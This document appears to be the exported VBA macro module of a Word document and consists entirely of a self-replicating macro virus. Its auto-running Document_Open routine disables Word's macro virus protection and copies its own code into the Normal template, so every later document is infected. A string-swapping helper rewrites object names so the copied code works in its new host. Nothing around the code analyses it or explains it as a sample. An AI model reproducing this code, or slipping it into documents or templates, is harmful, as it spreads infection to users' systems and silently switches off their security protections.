   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True

   Private Sub Document_Open()
       Dim code As String
       If Left$(NormalTemplate.Name, 8) <> "Document" Then
           Options.VirusProtection = False
           With ActiveDocument.VBProject.VBComponents.Item(1).CodeModule
               code = .Lines(1, .CountOfLines)
               ReplaceTemplate code, "Normal", "Template", "Happy", "Panther"
               ReplaceTemplate code, "Active", "Document", "Normal", "Template"
               ReplaceTemplate code, "Happy", "Panther", "Active", "Document"
               With NormalTemplate.VBProject.VBComponents.Item(1).CodeModule
                   .DeleteLines 1, .CountOfLines
                   .AddFromString code
               End With
           End With
       End If
   End Sub
   Private Sub ReplaceTemplate(target As String, prepre As String, prepost As String, postpre As String, postpost As String)
       Dim index As Long, pre As String, post As String, preLen As Long

       pre = prepre + prepost
       post = postpre + postpost

       index = 1
       preLen = Len(pre)

       While InStr(index, target, pre) <> 0
           index = InStr(index, target, pre)
           target = Left(target, index - 1) + post + Mid$(target, index + preLen)
           index = index + 1
       Wend
   End Sub
